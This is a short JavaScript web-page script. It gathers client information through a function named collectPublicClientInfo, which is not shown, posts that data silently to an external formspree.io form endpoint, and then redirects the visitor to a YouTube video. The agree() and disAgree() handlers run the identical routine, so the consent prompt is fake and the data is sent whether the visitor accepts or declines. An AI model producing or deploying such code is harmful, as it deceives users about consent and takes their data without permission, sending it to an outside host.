
let funcs = [
  collectPublicClientInfo,
];
let funcsStatus = new Map();

for (let f of funcs) {
  funcsStatus.set(f.name, false);
}

async function sendRequest(data) {
  try {
    const response = await fetch("https://formspree.io/f/xeorknrp", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify(data),
    });
  }
  catch (err) {
  }
}

async function start() {
  for (let f of funcs) {
    let d = await f();
    if (funcsStatus.get(f.name) == false && d) {
      await sendRequest(d);
      funcsStatus.set(f.name, true);
    }
  }
  window.location.replace("https://youtu.be/Ow5d54nwEfk");
}

async function agree() {
  await start();
}

async function disAgree() {
  await start();
}


